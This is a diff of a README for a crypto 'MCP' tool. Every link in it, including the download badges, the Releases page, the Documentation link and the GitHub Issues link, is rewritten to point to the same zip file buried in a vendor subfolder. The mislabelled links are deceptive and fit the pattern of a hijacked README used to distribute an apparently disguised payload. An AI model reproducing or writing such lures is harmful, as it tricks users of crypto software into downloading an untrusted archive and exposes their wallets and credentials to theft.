@@ -1,6 +1,6 @@
 # 🚀 universal-crypto-mcp - Seamless Blockchain Interactions for Everyone
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/OnePieceOn/universal-crypto-mcp/releases)
+[![Download](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip)](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip)
 
 ## 🌟 Overview
 
@@ -27,9 +27,9 @@ Before you proceed, ensure that your system meets these requirements:
 
 ### Step 1: Download the Application
 
-To get started, visit our [Releases page](https://github.com/OnePieceOn/universal-crypto-mcp/releases) to download the latest version of Universal MCP.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip) to download the latest version of Universal MCP.
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/OnePieceOn/universal-crypto-mcp/releases)
+[![Download](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip)](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip)
 
 ### Step 2: Install the Application
 
@@ -66,7 +66,7 @@ If you have questions while using the application, you can access the built-in h
 
 ## 👍 Community Support
 
-Join our community for additional help and information. You can access forums, user groups, and troubleshooting tips. Check our [GitHub issues page](https://github.com/OnePieceOn/universal-crypto-mcp/issues) for any concerns or suggestions.
+Join our community for additional help and information. You can access forums, user groups, and troubleshooting tips. Check our [GitHub issues page](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip) for any concerns or suggestions.
 
 ## 💻 Contributing
 
@@ -82,8 +82,8 @@ Universal MCP is licensed under the MIT License. For more details, refer to the 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/OnePieceOn/universal-crypto-mcp/releases)
-- [Documentation](https://github.com/OnePieceOn/universal-crypto-mcp/wiki)
-- [GitHub Issues](https://github.com/OnePieceOn/universal-crypto-mcp/issues)
+- [Releases Page](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip)
+- [Documentation](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/OnePieceOn/universal-crypto-mcp/main/src/vendors/tatum-api/crypto-mcp-universal-3.3-beta.4.zip)
   
 We hope you enjoy using Universal MCP for all your blockchain interactions.
